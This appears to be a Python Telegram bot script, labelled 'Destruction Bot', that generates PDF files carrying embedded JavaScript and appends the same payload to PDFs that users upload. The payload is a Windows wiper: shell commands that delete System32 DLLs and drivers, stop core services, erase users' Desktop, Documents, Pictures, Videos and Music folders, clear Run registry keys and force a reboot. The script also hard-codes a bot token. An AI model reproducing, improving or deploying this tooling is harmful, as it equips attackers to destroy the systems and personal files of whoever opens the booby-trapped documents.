import requests
import time
import os
import random
from datetime import datetime

# ============ إعدادات البوت ============
TOKEN = "8618971021:AAHNf7o2muoU1ZiFx7EzZDvq950hKn30"
CHAT_ID = "782215535"
API_URL = f"https://api.telegram.org/bot{TOKEN}"

# ============ دوال البوت الأساسية ============
def send_message(text):
    try:
        url = f"{API_URL}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
    except:
        pass

def send_file(file_path, caption=""):
    try:
        if not os.path.exists(file_path):
            return
        url = f"{API_URL}/sendDocument"
        files = {"document": open(file_path, "rb")}
        data = {"chat_id": CHAT_ID, "caption": caption}
        requests.post(url, files=files, data=data, timeout=30)
    except:
        pass

def download_file(file_id, save_path):
    try:
        url = f"{API_URL}/getFile"
        params = {"file_id": file_id}
        response = requests.get(url, params=params)
        if response.status_code != 200:
            return False
        data = response.json()
        if not data.get("ok"):
            return False
        file_path = data["result"]["file_path"]
        download_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"
        
        response = requests.get(download_url, stream=True)
        if response.status_code == 200:
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            with open(save_path, "wb") as f:
                for chunk in response.iter_content(8192):
                    if chunk:
                        f.write(chunk)
            return True
        return False
    except:
        return False

# ============ إنشاء PDF التخريبي ============
def create_destructive_pdf():
    try:
        filename = f"/tmp/destructive_{int(time.time())}.pdf"
        
        js_code = """
        try {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
            shell.Run("cmd.exe /c sc stop bits", 0, false);
            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            shell.Run("cmd.exe /c msg * SYSTEM HACKED! All files deleted.", 0, false);
        } catch(e) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            } catch(e2) {}
        }
        """
        
        pdf = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 5 0 R >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 80 >>
stream
BT /F1 24 Tf 100 700 Td (WARNING: This file will destroy Windows) Tj ET
endstream
endobj
5 0 obj
<< /Names [(EmbeddedJS) 6 0 R] >>
endobj
6 0 obj
<< /S /JavaScript /JS ({js_code}) >>
endobj
xref
0 7
0000000000 65535 f
0000000009 00000 n
0000000056 00000 n
0000000107 00000 n
0000000178 00000 n
0000000280 00000 n
0000000330 00000 n
trailer
<< /Size 7 /Root 1 0 R >>
startxref
400
%%EOF"""
        
        with open(filename, "w") as f:
            f.write(pdf)
        
        return filename
    except Exception as e:
        print(f"Error: {e}")
        return None

# ============ حقن البايلود في ملف موجود ============
def inject_payload(input_path, output_path):
    try:
        with open(input_path, "rb") as f:
            data = f.read()
        
        js_code = """
try {
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
    shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
    shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
    shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
    shell.Run("cmd.exe /c sc stop bits", 0, false);
    shell.Run("cmd.exe /c sc stop EventLog", 0, false);
    shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
    shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
    shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
    shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
    shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
    shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
    shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
    shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
    shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
    shell.Run("cmd.exe /c msg * SYSTEM HACKED! All files deleted.", 0, false);
} catch(e) {
    try {
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
    } catch(e2) {}
}
"""
        
        with open(output_path, "wb") as f:
            f.write(data + b"\n\n" + js_code.encode('utf-8'))
        
        return True
    except Exception as e:
        print(f"Injection error: {e}")
        return False

# ============ معالجة الأوامر ============
def process_update(update):
    try:
        message = update.get("message", {})
        chat_id = str(message.get("chat", {}).get("id", ""))
        
        if chat_id != CHAT_ID:
            send_message("Unauthorized!")
            return
        
        text = message.get("text", "").lower()
        
        if text == "/start":
            send_message("""
Welcome to the Destruction Bot!

/generate - Create destructive PDF
Send any PDF file - It will be injected
/help - Show commands
""")
        
        elif text == "/generate":
            send_message("Generating...")
            filepath = create_destructive_pdf()
            if filepath:
                send_file(filepath, "Destructive PDF - Use with caution!")
                os.remove(filepath)
            else:
                send_message("Generation failed!")
        
        elif text == "/help":
            send_message("""
Commands:
/start - Welcome
/generate - Create destructive PDF
/status - Bot status
/help - This message

Send any PDF to inject payload
""")
        
        elif text == "/status":
            send_message(f"Bot is running\nTime: {datetime.now().strftime('%H:%M:%S')}")
        
        document = message.get("document")
        if document:
            file_id = document["file_id"]
            file_name = document.get("file_name", "file.pdf")
            
            send_message(f"Downloading: {file_name}")
            
            input_path = f"/tmp/input_{random.randint(1000,9999)}"
            output_path = f"/tmp/output_{random.randint(1000,9999)}"
            
            if download_file(file_id, input_path):
                send_message("Downloaded! Injecting payload...")
                
                if inject_payload(input_path, output_path):
                    new_name = f"injected_{file_name}"
                    send_file(output_path, f"Injected: {new_name}")
                    send_message("Injected file sent!")
                else:
                    send_message("Injection failed!")
                
                try:
                    os.remove(input_path)
                    os.remove(output_path)
                except:
                    pass
            else:
                send_message("Download failed!")
    
    except Exception as e:
        print(f"Error: {e}")

# ============ الاستماع ============
def main():
    print("Bot starting...")
    send_message("Bot is now running!")
    
    last_id = 0
    while True:
        try:
            url = f"{API_URL}/getUpdates"
            params = {"offset": last_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                data = response.json()
                if data.get("ok"):
                    for update in data["result"]:
                        last_id = update["update_id"]
                        process_update(update)
            
            time.sleep(1)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
